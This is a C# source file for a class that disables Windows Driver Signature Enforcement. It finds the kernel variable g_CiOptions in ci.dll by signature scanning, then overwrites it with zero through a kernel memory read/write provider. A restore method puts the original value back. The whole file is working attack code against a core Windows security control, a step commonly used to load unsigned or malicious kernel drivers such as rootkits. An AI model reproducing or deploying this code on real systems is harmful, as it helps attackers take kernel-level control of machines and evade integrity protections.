using KernelMode.Providers;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using KernelMode.Driver;

namespace KernelMode.Utils
{
    public static class DsePatcher
    {
        private static ulong _ciOptionsAddress = 0;
        private static byte _originalCiOptionsValue = 0;

        // Signature for finding g_CiOptions on modern Windows 10/11 systems.
        // This pattern targets the instruction that references g_CiOptions.
        private static readonly byte[] CiOptionsSignature = { 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x8B, 0xD0 };

        public static bool Disable(IProvider provider)
        {
            if (_ciOptionsAddress == 0)
            {
                _ciOptionsAddress = FindCiOptionsAddress(provider);
                if (_ciOptionsAddress == 0)
                {
                    Console.WriteLine("[-] Could not find g_CiOptions address. DSE patch failed.");
                    return false;
                }
                Console.WriteLine($"[+] Found g_CiOptions at: 0x{_ciOptionsAddress:X}");

                // Save the original value so we can restore it later.
                byte[] originalValue = new byte[1];
                if (!provider.ReadMemory(_ciOptionsAddress, originalValue, 1))
                {
                    Console.WriteLine("[-] Failed to read original DSE value.");
                    return false;
                }
                _originalCiOptionsValue = originalValue[0];
                Console.WriteLine($"[*] Original g_CiOptions value: 0x{_originalCiOptionsValue:X}");
            }

            Console.WriteLine("[*] Patching g_CiOptions to disable DSE...");
            byte[] patch = { 0x00 }; // A value of 0 disables DSE.
            if (!provider.WriteMemory(_ciOptionsAddress, patch, 1))
            {
                Console.WriteLine("[-] Failed to write to g_CiOptions.");
                return false;
            }

            Console.WriteLine("[+] DSE disabled successfully.");
            return true;
        }

        public static bool Enable(IProvider provider)
        {
            if (_ciOptionsAddress == 0 || _originalCiOptionsValue == 0)
            {
                Console.WriteLine("[!] DSE was not disabled or original value was not saved. Cannot enable.");
                return false;
            }

            Console.WriteLine($"[*] Restoring g_CiOptions to its original value (0x{_originalCiOptionsValue:X})...");
            byte[] patch = { _originalCiOptionsValue };
            if (!provider.WriteMemory(_ciOptionsAddress, patch, 1))
            {
                Console.WriteLine("[-] Failed to restore g_CiOptions.");
                return false;
            }

            Console.WriteLine("[+] DSE restored successfully.");
            _ciOptionsAddress = 0; // Reset for next time.
            _originalCiOptionsValue = 0;
            return true;
        }

        private static ulong FindCiOptionsAddress(IProvider provider)
        {
            var ciModule = DriverLoader.GetKernelModule("ci.dll");
            if (ciModule.ImageBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to find ci.dll module information.");
                return 0;
            }

            // Read the entire CI module from kernel memory to scan for the signature.
            byte[] ciImage = new byte[ciModule.ImageSize];
            if (!provider.ReadMemory((ulong)ciModule.ImageBase, ciImage, ciImage.Length))
            {
                Console.WriteLine("[-] Failed to read ci.dll from kernel memory.");
                return 0;
            }

            // Find the signature in the module's memory.
            for (int i = 0; i < ciImage.Length - CiOptionsSignature.Length; i++)
            {
                bool found = true;
                for (int j = 0; j < CiOptionsSignature.Length; j++)
                {
                    // Wildcard for the relative offset part of the instruction.
                    if (CiOptionsSignature[j] == 0x00 && j >= 3 && j <= 6) continue;
                    if (ciImage[i + j] != CiOptionsSignature[j])
                    {
                        found = false;
                        break;
                    }
                }

                if (found)
                {
                    // The signature is for an instruction like: LEA RCX, [RIP + offset]
                    // We need to resolve the address pointed to by the instruction.
                    int instructionOffset = i;
                    int relativeOffset = BitConverter.ToInt32(ciImage, instructionOffset + 3);
                    ulong instructionAddress = (ulong)ciModule.ImageBase + (ulong)instructionOffset;
                    
                    // The address of g_CiOptions is RIP (next instruction) + relative offset.
                    return instructionAddress + 7 + (ulong)relativeOffset;
                }
            }

            return 0;
        }
    }
}